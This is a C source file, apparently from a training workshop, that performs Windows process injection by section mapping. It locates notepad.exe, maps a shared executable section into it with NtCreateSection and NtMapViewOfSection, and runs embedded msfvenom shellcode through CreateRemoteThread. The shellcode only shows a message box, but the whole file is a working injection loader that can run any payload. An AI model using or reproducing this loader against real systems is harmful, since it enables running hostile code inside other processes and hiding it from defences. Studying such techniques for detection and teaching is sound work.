#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment(lib, "ntdll")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DWORD searching_seek_and_destroy(wchar_t* process_name) {

    HANDLE handleSnapshot;
    PROCESSENTRY32 process;
    int pid = 0;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    process.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(handleSnapshot, &process)) goto ExitAndCleanup;

    do {

        printf("process name : %ws\n", process.szExeFile);

        if (lstrcmpiW((LPCWSTR)process_name, process.szExeFile) == 0) {

            printf("\nWe found %ws !\n", process.szExeFile);
            pid = process.th32ProcessID;
            break;
        }
    } while (Process32Next(handleSnapshot, &process));

ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return pid;
}

void injection_mapview(unsigned char* payload, SIZE_T size, wchar_t* target_process) {

    HANDLE HandleThread = NULL;
    HANDLE handleProcess = NULL;
    LPVOID PointerToCode = NULL;
    int pid = 0;

    HANDLE handleSection = NULL;
    LPVOID sectionLocalAddress = NULL;
    LPVOID sectionRemoteAddress = NULL;
    NTSTATUS status = NULL;
    SIZE_T sizeSection = size;

    printf("Searching for noeatepad\n");

    pid = searching_seek_and_destroy(target_process);

    if (pid == 0) goto ExitAndCleanup;

    handleProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (handleProcess == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    status = NtCreateSection(&handleSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sizeSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    status = NtMapViewOfSection(handleSection, GetCurrentProcess(), &sectionLocalAddress, NULL, NULL, NULL, (PSIZE_T)&sizeSection, 2, NULL, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    status = NtMapViewOfSection(handleSection, handleProcess, &sectionRemoteAddress, NULL, NULL, NULL, (PSIZE_T)&sizeSection, 2, NULL, PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    memcpy(sectionLocalAddress, payload, size);


    HandleThread = CreateRemoteThread(handleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)sectionRemoteAddress, 0, 0, NULL);

    if (HandleThread == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    WaitForSingleObject(HandleThread, INFINITE);

ExitAndCleanup:
    if (HandleThread != INVALID_HANDLE_VALUE) {
        NtClose(HandleThread);
    }
    else {
        printf("Error while opening thread {X__x}\n");
    }
    if (sectionRemoteAddress != NULL){
        NtUnmapViewOfSection(handleProcess, sectionRemoteAddress);
    }
    else {
        printf("Error while creating remote view {X__x}\n");
    }
    if (sectionLocalAddress != NULL) {
        NtUnmapViewOfSection(GetCurrentProcess(), sectionLocalAddress);
    }
    else {
        printf("Error while creating local view {X__x}\n");
    }
    if (handleSection != INVALID_HANDLE_VALUE){
        CloseHandle(handleSection);
    }
    else {
        printf("Error while creatingaaa section {X__x}\n");
    }
    if (handleProcess != INVALID_HANDLE_VALUE){
        CloseHandle(handleProcess);
    }
    else {
    printf("Error while opening process {X__x}\n");
    }

    printf("The End!\n");
}



void main(void) {

    // shellcode generation MSGBOX -> msfvenom -p windows/x64/messagebox TITLE="Evil Malware" TEXT="BlackHoodie Rulez!" ICON=WARNING EXITFUNC=thread -f c
    //Payload size: 327 bytes
    unsigned char MyPayload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x30\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x42\x6c\x61\x63\x6b"
        "\x48\x6f\x6f\x64\x69\x65\x20\x52\x75\x6c\x65\x7a\x21\x00\x45"
        "\x76\x69\x6c\x20\x4d\x61\x6c\x77\x61\x72\x65\x00";

    SIZE_T SizePayload = sizeof(MyPayload);

    printf("Payload size is %d bytes\n", (int)SizePayload);

    injection_mapview(MyPayload, SizePayload, L"notepad.exe");

}
